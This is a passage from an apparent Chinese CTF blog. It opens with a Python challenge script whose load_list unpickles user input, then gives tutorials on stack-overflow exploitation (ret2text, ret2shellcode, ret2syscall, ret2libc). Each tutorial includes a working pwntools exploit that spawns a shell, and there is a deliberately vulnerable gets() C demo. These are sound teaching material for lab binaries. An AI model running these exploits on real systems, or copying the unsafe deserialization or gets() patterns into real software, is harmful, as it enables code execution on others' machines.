King George and the Ducky","12. Esther... The Girl Who Became Queen","13. Lyle the Kindly Viking","14. The Star of Christmas","15. The Wonderful World of Autotainment","16. The Ballad of Little Joe","17. An Easter Carol","18. A Snoodles Tale","19. Sumo of the Opera","20. Duke and the Great Pie War","21. Minnesota Cuke and the Search for Samsons Hairbrush","22. Lord of the Beans","23. Sheerluck Holmes and the Golden Ruler","24. LarryBoy and the Bad Apple","25. Gideon: Tuba Warrior","26. Moe and the Big Exit","27. The Wonderful Wizard of Has","28. Tomato Sawyer and Huckleberry Larrys Big River Rescue","29. Abe and the Amazing Promise","30. Minnesota Cuke and the Search for Noahs Umbrella","31. Saint Nicholas: A Story of Joyful Giving","32. Pistachio - The Little Boy That Woodnt","33. Sweetpea Beauty: A Girl After Gods Own Heart","34. Its a Meaningful Life","35. Twas The Night Before Easter","36. Princess and the Popstar","37. The Little Drummer Boy","38. Robin Good And His Not-So Merry Men","39. The Penniless Princess","40. The League of Incredible Vegetables","41. The Little House That Stood","42. MacLarry and the Stinky Cheese Battle","43. Merry Larry and the True Light of Christmas","44. Veggies in Space: The Fennel Frontier","45. Celery Night Fever","46. Beauty and the Beet","47. Noahs Ark"] def sortByNum(episode): return int(episode[:episode.find('.')])def add_episode(): for episode in all_episodes: print("%s" % episode) episode_num = str(input("Enter an episode (by number) to add to your watched list: ")) while not (episode_num.isdigit() and (0 &lt; int(episode_num) &lt; 48)): episode_num = str(input("Enter a valid integer between 1 and 47!!")) if all_episodes[int(episode_num)-1] in my_episodes: print("That episode is already in your list.") else: my_episodes.append(all_episodes[int(episode_num)-1]) print("episode added!") my_episodes.sort(key=sortByNum)def check_list(): print("----------------------") print("List of watched episodes:") if len(my_episodes) == 0: print(":(") for episode in my_episodes: print("%s" % episode) print("----------------------")def backup_list(): pickled = codecs.encode(str(base64.b64encode(pickle.dumps(my_episodes))),"rot-13").strip("o\'") print("Episode list backup string (Don't lose it!): %s\n" % pickled)def load_list(): answer = str(input("Load your backed up list here: ")) try: global my_episodes my_episodes = pickle.loads(base64.b64decode(codecs.encode(answer,"rot-13"))) print("Loaded backup\n") except: print("Invalid backup")if __name__ == "__main__": print("Do you like VeggieTales??") message = "1. Add an episode to your watched list\n2. Print your watch list\n3. Backup your watch list\n4. Load your watch list\n" while True: listen = str(input(message)) if len(listen) == 1 and listen in "1234": [add_episode, check_list, backup_list, load_list][int(listen) - 1]() message = "1. Add an episode to your watched list\n2. Print your watch list\n3. Backup your watch list\n4. Load your watch list\n" else: message = "Error: Please choose from options 1-4!!\n" 看来这是一道归类到Pwn的Web题 : ) Pwn6Pwn6没做出来也不会做，可以参考其他大佬的writeup： pwn6 - Pwn TAMUCTF 2019]]></content>
      <categories>
        <category>WriteUp:Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出之ret2libc]]></title>
    <url>%2F2019%2F03%2F05%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc%2F</url>
    <content type="text"><![CDATA[ret2libc原理ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 具体过程为：在内存中确定某个函数的地址，并用其覆盖掉返回地址，让其指向前面确定的函数。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。 payload: padding1 + address of system() + padding2 + address of “/bin/sh” padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。 第一个问题——system()地址如何确定？ 要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。 第二个问题——“/bin/sh”字符串地址如何确定？ 可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。 前提条件 由前面分析可知，ret2libc这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）。 ret2libc1——存在system()、/bin/sh运行程序，提示应用ret2libc，且用file查看是动态链接文件，和libc有关： 查看保护机制，只开启了NX： IDA查看： 搜索“/bin/sh”字符串，可通过string窗口或ROPgadget工具查找： 或 可知“/bin/sh”字符串所在地址为0x08048720。 因为要从libc中寻找利用函数，则可以在ida直接查看plt中是否有system()函数，发现是存在有的且地址为0x08048460： 至于用户输入的变量v4距函数返回地址的偏移地址的计算如之前所示，结果是一样的为0x70。 编写payload： 12345678from pwn import *sh = process("./ret2libc1")binsh_addr = 0x08048720libc_system_addr = 0x08048460payload = flat(["A" * 0x70, libc_system_addr, "6666", binsh_addr])sh.sendline(payload)sh.interactive() 运行getshell： ret2libc2——只有system()运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX： 使用IDA打开查看： 在string窗口确实找不到“/bin/sh”： 在plt中仍可找到system()函数，地址为0x08048490： 可以发现与示例1相比，这次不直接提供“/bin/sh”，那就换种思维，多利用一个gadgets，可以在plt中看到有gets()函数，即可以将该gets()函数地址用来踩掉原本程序函数的返回地址，然后通过输入的方式将“/bin/sh”输入进去。换句话说，整个过程分成了两部分，第一部分是将“/bin/sh”读入到内存中；第二部分是执行system()获取shell： 其中可知get()函数地址为08048460。 查看gets()函数，其需要一个可读可写的指针参数，且会返回值： 寻找一块可读可写的buffer区，通常会寻找.bss段，使用IDA查看可看到存在buf2[100]数组： 明确该.bss段是否可读可写： 最后就是payload的构造了。因为在gets()函数完成后需要调用system()函数需要保持堆栈平衡，所以在调用完gets()函数后提升堆栈，这就需要add esp, 4这样的指令但是程序中并没有这样的指令。更换思路，通过使用pop xxx指令也可以完成同样的功能，在程序中找到了pop ebx，ret指令。通过ROPgadget工具查看，发现存在一条符合条件的指令，地址为0x0804841d： 编写payload： 1234567891011from pwn import *sh = process("./ret2libc2")libc_gets_addr = 0x08048460libc_system_addr = 0x08048490buf2_addr = 0x0804a080pop_ebx_addr = 0x0804841dpayload = flat(["A" * 0x70, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, '6666', buf2_addr])sh.sendline(payload)sh.sendline('/bin/sh')sh.interactive() 运行getshell： ret2libc3——无system()和/bin/sh在ret2libc2的基础上，再次将system()函数的地址去掉。此时，我们需要同时找到system())函数地址与”/bin/sh”字符串的地址。 题目分析运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX： IDA打开查看，同样是栈溢出漏洞： 在String窗口找不到“/bin/sh”字符串，在Functions窗口中也找不到system()函数： 但是在libc中是有system()函数和/bin/sh字符串的。因此，我们可以通过泄露libc中某个被调用过的函数的地址来获取libc版本，获取libc中各个偏移地址值，然后通过某个函数的真实地址计算出system()和/bin/bash的真实地址。 结合前面知道，溢出点到函数返回地址的偏移量和前面的一样，为112。 结合libc的延迟绑定机制，下面要做的是需要我们泄露某个已经执行过的函数的真实地址，实现泄露地址功能的函数可以通过puts()函数来输出打印出来实现，而参数填的是某个已经执行过的函数的GOT地址；同时为了程序再次执行能重新实现栈溢出功能，在puts()函数的返回地址填的是_start()函数或main()函数地址即可。 对于system()函数，其属于libc，在libc.so动态链接库中的函数之间相对偏移是固定的。我们由泄露的某个函数的GOT表地址可以计算出偏移地址（A真实地址-A的偏移地址 = B真实地址-B的偏移地址 = 基地址），从而可以得到system()函数的真实地址（当然也可以直接调用pwntools的libc.address得到libc的真实地址，然后再直接查找即可找到真实的system()函数地址）。 利用过程图以泄露puts()的GOT地址为例，构造过程如下图，红色箭头为第一次溢出调用，通过gets()栈溢出至函数返回地址处将其覆盖为puts的plt地址，将puts的GOT表地址泄露输出出来，再返回到_start()函数重新执行程序；蓝色箭头为程序第二次执行时的溢出调用，重新通过gets()输入内容栈溢出至函数返回地址处，覆盖该地址为libc中找到的system()地址（libc地址由泄露的puts函数地址计算得出），从而getshell： 利用过程小结 程序通过gets()函数获取输入的内容，存在明显的栈溢出漏洞； 在ELF中未找到system()和”/bin/sh”； 计算出输入内容地址到函数返回地址的偏移量为112； 将puts()的plt地址覆盖到函数返回地址处，通过puts()泄露某个已执行过的函数的GOT地址，并且返回地址设置为_start()或main()，以便于重新执行一遍程序； 通过recv(4)接收puts()输出泄露的某个已执行过的函数的GOT地址，再以此来计算libc中地址与真实地址的偏移量，从而计算出libc中system()函数和”/bin/sh”字符串的真实地址；或者通过泄露的某个已执行过的函数的GOT地址，直接使用pwntools的libc.address=func_got-libc.symbols[‘func’]的形式直接获取libc的真实地址，从而直接通过system_addr=libc.symbols[‘system’]的方式直接获取该函数真实地址； 程序再次执行时填充padding，在函数返回地址处覆盖为libc中system()函数的真实地址，其中参数为libc中”/bin/sh”字符串的真实地址。 payload编写在第一次栈溢出puts()的plt地址覆盖函数返回地址时，puts()的返回地址可以设置为_start()或main()函数地址。 _start()和main()的区别简单地说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。 我们可以看下本题的_start()函数内容，其包含main()和__libc_start_main()函数的调用，也就是说，它才是程序真正的入口： 返回地址为_start()函数这里的示例只展示了两个可利用的函数puts()和__libc_start_main()。 泄露puts()函数地址 12345678910111213141516171819202122232425262728293031323334from pwn import *sh = process('./ret2libc3')elf = ELF('./ret2libc3')libc = elf.libcputs_plt = elf.plt['puts']puts_got = elf.got['puts']start_addr = elf.symbols['_start']print "[*]puts plt: " + hex(puts_plt)print "[*]puts got: " + hex(puts_got)print "[*]_start addr: " + hex(start_addr)print "[*]libc addr: " + hex(libc.address)print "--" * 20print "[*]sending payload1 to leak libc..."payload = flat(["A" * 112, puts_plt, start_addr, puts_got])sh.sendlineafter("Can you find it !?", payload)puts_addr = u32(sh.recv(4))print "[*]leak puts addr: " + hex(puts_addr)libc.address = puts_addr - libc.symbols['puts']system_addr = libc.symbols['system']binsh_addr = next(libc.search('/bin/sh'))print "[*]leak libc addr: " + hex(libc.address)print "[*]system addr: " + hex(system_addr)print "[*]binsh addr: " + hex(binsh_addr)print "--" * 20print "[*]sending payload2 to getshell..."payload2 = flat(["B" * 112, system_addr, "CCCC", binsh_addr])sh.sendline(payload2)sh.interactive() 泄露__libc_start_main()函数地址 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *sh = process('./ret2libc3')elf = ELF('./ret2libc3')libc = elf.libcputs_plt = elf.plt['puts']#puts_got = elf.got['puts']libc_start_main_got = elf.got['__libc_start_main']start_addr = elf.symbols['_start']print "[*]puts plt: " + hex(puts_plt)print "[*]__libc_start_main got: " + hex(libc_start_main_got)#print "[*]puts got: " + hex(puts_got)print "[*]_start addr: " + hex(start_addr)print "[*]libc addr: " + hex(libc.address)print "--" * 20print "[*]sending payload1 to leak libc..."#payload = flat(["A" * 112, puts_plt, start_addr, puts_got])payload = flat(["A" * 112, puts_plt, start_addr, libc_start_main_got])sh.sendlineafter("Can you find it !?", payload)#puts_addr = u32(sh.recv(4))#print "[*]leak puts addr: " + hex(puts_addr)libc_start_main_addr = u32(sh.recv(4))print "[*]leak __libc_start_main addr: " + hex(libc_start_main_addr)#libc.address = puts_addr - libc.symbols['puts']libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']system_addr = libc.symbols['system']binsh_addr = next(libc.search('/bin/sh'))print "[*]leak libc addr: " + hex(libc.address)print "[*]system addr: " + hex(system_addr)print "[*]binsh addr: " + hex(binsh_addr)print "--" * 20print "[*]sending payload2 to getshell..."payload2 = flat(["B" * 112, system_addr, "CCCC", binsh_addr])sh.sendline(payload2)sh.interactive() 返回地址为main()函数先将_start()换成main()，payload2的B字符的偏移量不变，运行脚本会报错，添加GDB调试交互发现溢出多了8个B： 相应的，减少8个B字符即112-8=104就可以有效溢出从而getshell： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *sh = process('./ret2libc3')elf = ELF('./ret2libc3')libc = elf.libcif args.M: gdb.attach(sh)puts_plt = elf.plt['puts']#puts_got = elf.got['puts']libc_start_main_got = elf.got['__libc_start_main']#start_addr = elf.symbols['_start']main_addr = elf.symbols['main']print "[*]puts plt: " + hex(puts_plt)print "[*]__libc_start_main got: " + hex(libc_start_main_got)#print "[*]puts got: " + hex(puts_got)#print "[*]_start addr: " + hex(start_addr)print "[*]main addr: " + hex(main_addr)print "[*]libc addr: " + hex(libc.address)print "--" * 20print "[*]sending payload1 to leak libc..."#payload = flat(["A" * 112, puts_plt, start_addr, puts_got])#payload = flat(["A" * 112, puts_plt, start_addr, libc_start_main_got])payload = flat(["A" * 112, puts_plt, main_addr, libc_start_main_got])sh.sendlineafter("Can you find it !?", payload)#puts_addr = u32(sh.recv(4))#print "[*]leak puts addr: " + hex(puts_addr)libc_start_main_addr = u32(sh.recv(4))print "[*]leak __libc_start_main addr: " + hex(libc_start_main_addr)#libc.address = puts_addr - libc.symbols['puts']libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']system_addr = libc.symbols['system']binsh_addr = next(libc.search('/bin/sh'))print "[*]leak libc addr: " + hex(libc.address)print "[*]system addr: " + hex(system_addr)print "[*]binsh addr: " + hex(binsh_addr)print "--" * 20print "[*]sending payload2 to getshell..."payload2 = flat(["B" * 104, system_addr, "CCCC", binsh_addr])sh.sendline(payload2)sh.interactive() 参考手把手教你栈溢出从入门到放弃（上） ret2libc]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出之ret2syscall]]></title>
    <url>%2F2019%2F03%2F03%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2syscall%2F</url>
    <content type="text"><![CDATA[ret2syscallret2syscall，即控制程序执行系统调用，获取shell。 关键在于——程序中存在int 0x80中断，通过该指令可以进行系统调用，其中可通过不同的系统调用号调用不同的系统调用。 一般地，我们利用如下系统调用来获取shell： 1execve(&quot;/bin/sh&quot;,NULL,NULL) 当遇到32位程序时，需要使得： 系统调用号，即 eax 应该为 0xb（0xb 为 execve 对应的系统调用号） 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 而我们如何控制这些寄存器的值呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。 解题过程先运行程序查看基本功能，并file看到是静态链接文件，和libc无关： checksec发现只开启了NX： 打开IDA看到存在gets()即存在栈溢出风险，且IDA中给出变量v4相对于ESP和EBP的偏移分别为ESP+1Ch和EBP-64h： 查看String窗口，发现存在“/bin/sh”字符串： 当然还可以使用ROPgadget工具搜索，直接找到“/bin/sh”字符串的存储地址，记下该字符串地址为0x080be408： 因为是静态链接，不用看libc相关函数，而且函数太多了，直接搜索系统调用吧，记下系统调用的地址为0x08049421： 接着寻找pop eax~edx+ret寄存器的指令，记下符合条件的地址分别为0x080bb196和0x0806eb90： 至于v4变量到函数返回地址处的偏移量和前面几个题目的计算方法即结果都是一样的，这里不再多说。 编写payload： 12345678910from pwn import *sh = process("./ret2syscall")int_80_addr = 0x08049421binsh = 0x080be408pop_eax_addr = 0x080bb196pop_edx_ecx_ebx_addr = 0x0806eb90payload = flat(["A" * 0x70, pop_edx_ecx_ebx_addr, 0, 0, binsh, pop_eax_addr, 0xb, int_80_addr])sh.sendline(payload)sh.interactive() 运行后getshell： 参考ret2syscall]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出之ret2shellcode]]></title>
    <url>%2F2019%2F03%2F03%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2shellcode%2F</url>
    <content type="text"><![CDATA[ret2shellcoderet2shellcode，即控制程序执行shellcode代码——修改函数返回地址，让其指向溢出数据中的一段指令。 shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。另外，要想执行 shellcode，需要shellcode所在的区域具有可执行权限。 ret2shellcode的实现在于：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。 payload : padding1 + address of shellcode + padding2 + shellcode padding1 处的数据可以随意填充（注意如果利用字符串程序输入溢出数据不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of shellcode 是后面 shellcode 起始处的地址，用来覆盖返回地址。padding2 处的数据也可以随意填充，长度可以任意。shellcode 应该为十六进制的机器码格式，但有个前提是shellcode所在的代码段需要具有可执行权限。 一个问题——shellcode地址如何确定？ 我们可以在调试工具里查看返回地址的位置（可以查看 ebp 的内容然后再加4（32位机）），可是在调试工具里的这个地址和正常运行时并不一致，这是运行时环境变量等因素有所不同造成的。所以这种情况下我们只能得到大致但不确切的 shellcode 起始地址，解决办法是在 padding2 里填充若干长度的 “\x90”。这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled。这样我们就可以通过增加 NOP 填充来配合试验 shellcode 起始地址。 操作系统可以将函数调用栈的起始地址设为随机化（这种技术被称为内存布局随机化，即ASLR），这样程序每次运行时函数返回地址会随机变化。反之如果操作系统关闭了上述的随机化（这是技术可以生效的前提），那么程序每次运行时函数返回地址会是相同的，这样我们可以通过输入无效的溢出数据来生成core文件，再通过调试工具在core文件中找到返回地址的位置，从而确定 shellcode 的起始地址。 最后可以拼接出最终的溢出数据，输入至程序来执行 shellcode 了： 这种方法生效的一个前提是在函数调用栈上的数据（shellcode）要有可执行的权限（另一个前提是上面提到的关闭内存布局随机化）。很多时候操作系统会关闭函数调用栈的可执行权限，这样 shellcode 的方法就失效了，不过我们还可以尝试使用内存里已有的指令或函数，毕竟这些部分本来就是可执行的，所以不会受上述执行权限的限制。这就包括ret2libc等其他的ROP方法。 前提条件 由前面分析可知，ret2shell这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）以及需要程序调用栈有可执行权限。 解题过程运行程序，提示这次没有system()给你直接调用，且文件是动态链接的： checksec可以看出源程序没有开启任何保护： IDA打开查看，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处，简单地说，就是程序允许用户输入一段内容，然后程序将该内容复制到buf2中： 点击查看可知buf2在bss段： string窗口确实如题目所示，没有直接提供system(“/bin/sh”)给我们调用了： 为了明确是否可以将shellcode写入buf2中执行，通过vmmap可以看到bss段对应的地址具有可执行权限（先main下断点、r再vmmap）： 可以看到，buf2变量所在的bss段是可读可写可执行的，因此这里可以输入shellcode、然后程序将shellcode复制至此处，最后在函数返回地址处踩掉该地址跳转至buf2执行shellcode。整个过程即为ret2shellcode原理。 使用GDB pattern字符串溢出计算变量v4到函数返回地址的偏移量为112，即0x70： 编写payload，使用pwntools的asm(shellcraft.sh())可以直接简便地生成汇编代码形式的反弹shell的shellcode： 12345678from pwn import *sh = process("./ret2shellcode")shellcode = asm(shellcraft.sh())buf2_addr = 0x0804a080payload = flat([shellcode.ljust(0x70, "A"), buf2_addr])sh.sendline(payload)sh.interactive() 运行直接getshell： 参考手把手教你栈溢出从入门到放弃（上） ret2shellcode]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ROP基础及栈溢出之ret2text]]></title>
    <url>%2F2019%2F03%2F03%2FROP%E4%B9%8Bret2text%2F</url>
    <content type="text"><![CDATA[ROPROP，Return Oriented Programming，核心操作就是——修改返回地址，让其指向内存中已有的一段指令，可用于绕过NX的保护机制。 ROP的思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。 之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件： 程序存在溢出，并且可以控制返回地址。 可以找到满足条件的 gadgets 以及相应 gadgets 的地址。 ROP要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。 下面看下单个Gadget和多个Gadgets进行溢出的原理示例。 单个Gadget溢出示例其payload是如下形式，使用padding溢出到返回地址前，再将gadget地址传到返回地址处： payload : padding + address of gadget 多个Gadgets溢出示例如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（EIP）才能得到切换，所以这种技术被称为返回导向编程( Return Oriented Programming )。要执行多个 gadget，溢出数据应该以下面的方式构造： payload : padding + address of gadget 1 + address of gadget 2 + …… + address of gadget n 在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 EIP，程序继续跳转执行 gadget 2，以此类推。 ……（待补充） ret2textret2text即控制程序执行程序本身已有的的代码 (.text)。也就是说，在该ELF的.text代码段中是存在可以利用的代码的，如存在system(“/bin/sh”)的代码。 下面按照一般的做题步骤做下吧。 一、运行程序，了解执行流程运行程序，输入内容后即返回： 二、file查看elf文件是否动态链接可用看到是32位ELF文件，且是动态链接的，即可能与libc相关： 三、checksec查看保护机制查看一下程序的保护机制，可以看到是32位的程序且仅仅开启了栈不可执行保护NX： 四、使用IDA进行静态汇编代码分析IDA打开查看，可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞，且可看到变量v4相对于ESP和EBP寄存器的偏移： 由于NX启动了即栈不可执行，我们可以到其他的地方查看，打开shift+F12打开string窗口，可用看到“/bin/sh/”字符串： 双击点击进去，发现是在secure函数中调用的： 点击后面的secure，进入secure函数发现了存在直接调用system(“/bin/sh”)的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到shell了： 现在已经明确了可利用的Gadget地址，即反弹shell的地址：0x0804863A。 五、计算偏移地址构造payload之前，需要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数。 Method 1——GDB断点调试获取先查看一下gets()函数的汇编代码，得知该字符串是通过相对于ESP的索引（具体如何判断可看后面的调试）： 可知gets()函数地址为0x080486AE，在该处设置断点进行调试： ESP为ffffcfa0，其中存放的内容为ffffcfbc，即输入的内容s的地址为ESP+1c= ffffcfbc，而EBP为ffffd028，则s到EBP的偏移为|ffffd028- ffffcfbc|=6c，所以s相对与返回地址的偏移为0x6c+4=0x70。 确认一遍，在gets()函数的下一条汇编指令处打断点，继续运行并输入一大串1： 可以发现EAX地址处确实保存的是s（数据换成1），且|EAX-ESP|=|0xffffcfbc-0xffffcfa0|=1c，即说明s是相对于ESP偏移的；但|EAX-EBP|=|0xffffcfbc-0xffffd028|=6c，和IDA给出的64h有差别，由此可知IDA给出的相对于ESP的偏移是正确的、但相对于EBP的偏移是有误差的，这就是之前说的IDA分析给出的偏移量并不那么可信。 Method2——使用GDB pattern字符串溢出计算偏移量GDB的pattern_create创建计算溢出偏移量的字符串，在输入内容时输入即可： pattern_offset算出偏移量： 得出s与函数返回地址的偏移为112即0x70。 六、编写payload由前面分析知，可以利用.text代码段区域中的system(“/bin/sh”)代码，该代码段即为可被ROP利用的Gadget，地址为0x0804863a，将其覆盖到函数返回地址处，前面再padding 70h个字节码即可： 1234567from pwn import *sh = process("./ret2text")binsh_addr = 0x0804863apayload = flat(["A" * 0x70, binsh_addr])sh.sendline(payload)sh.interactive() 运行后，成功getshell： 参考基本 ROP 手把手教你栈溢出从入门到放弃（下）]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>栈溢出</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[栈溢出基本原理]]></title>
    <url>%2F2019%2F03%2F03%2F%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[0x01 栈溢出基本原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是： 程序必须向栈上写入数据。 写入的数据大小没有被良好地控制。 当函数正在执行内部指令的过程中我们无法拿到程序的控制权，只有在发生函数调用或者结束函数调用时，程序的控制权会在函数状态之间发生跳转，这时才可以通过修改函数状态来实现攻击。而控制程序执行指令最关键的寄存器就是 EIP，所以栈溢出利用就是让 EIP载入攻击指令的地址。 1、函数调用结束时先来看看函数调用结束时，如果要让 EIP指向攻击指令，需要哪些准备。 首先，在Pop过程中，返回地址会被传给 EIP，所以我们只需要让溢出数据用攻击指令的地址来覆盖返回地址就可以了。其次，我们可以在溢出数据内包含一段攻击指令，也可以在内存其他位置寻找可用的攻击指令。 2、函数调用开始时再来看看函数调用开始时，如果要让 EIP指向攻击指令，需要哪些准备。 这时，EIP会指向原程序中某个指定的函数，我们没法通过改写返回地址来控制了，不过我们可以“偷梁换柱”——将原本指定的函数在调用时替换为其他函数。 0x02 Demo编写一段简单的调用gets()函数代码，主要目的读取一个字符串，并将其输出，可明显知道是存在栈溢出漏洞的，我们可以控制程序执行pwn()函数实现栈溢出效果测试： 12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;void pwn() &#123; puts("Stack Overflow! Hacked By Mi1k7ea."); &#125;void vulnerable() &#123; char s[12]; gets(s); puts(s); return;&#125;int main(int argc, char **argv) &#123; vulnerable(); return 0;&#125; 编译该c文件：gcc -m32 -fno-stack-protector stack_test.c -o stack_test。 gcc 编译指令中，-m32 指的是生成 32 位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令gcc -v查看 gcc 默认的开关情况。如果含有--enable-default-pie参数则代表 PIE 默认已开启，需要在编译指令中添加参数-no-pie。 可以看出，gcc警告说gets()是一个危险函数，它从不检查输入字符串的长度，而是以回车来判断输入是否结束，导致栈溢出漏洞存在。 下面就来简单描述一下栈溢出攻击利用的步骤吧。 1、运行程序，了解功能程序功能很简单，输入什么输出什么： 2、file查看elf文件是否动态链接可以看到，该ELF文件是动态链接的： 为什么要多做这可能没用的一步呢？因为后面会让我们提前知道这题到底会不会设计到libc相关的内容，若为静态文件则无需这方面的考虑。 3、checksec检查安全编译选项可以看到，只开启了NX，和GCC编译时的选项是一致的： 4、使用IDA进行静态汇编代码分析使用IDA打开该ELF文件，F5，点击vulnerable()函数，关注到其中的gets()函数是存在栈溢出漏洞的，而它的s参数在其上方定义了，关注到IDA给出变量s相对于ESP和EBP的偏移量分别为ESP+4h和EBP-14h： 由此知道，gets()导致存在栈溢出漏洞，而其参数s距离EBP的偏移地址为14h。 同时，点击查看我们需要溢出至调用的目标函数pwn()，记下它的地址0x0804843B： 5、计算偏移地址构造payload之前，需要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数。这里为计算变量s距离main()函数的返回地址的字节数。 由函数调用栈可知，要计算能够控制的内存的起始地址距离main()函数的返回地址的字节数，都是先通过计算出能够控制的内存的起始地址距离EBP的字节数，再加上4即可，看下图便一目了然： 其实由第四步的IDA分析可以知道，参数s距离EBP的偏移地址为14h。 但是有时候并不能完全相信IDA计算出来的偏移，最为准确的是用GDB打断点调试出来，下面介绍两种GDB方法。 （1）GDB断点调试获取先用IDA查看gets()函数的地址，获取到其地址为0x08048461： 在GDB中在该地址打下断点并运行，看到程序在调用gets()函数前停下，这时看到EBP为0xffffd028、ESP为0xffffd000： 由前面可知，变量s相对于ESP和EBP的偏移量分别为ESP+4h和EBP-14h，这里只看其距离EBP的距离，计算出s的地址为0xffffd028-14h=0xffffd014。 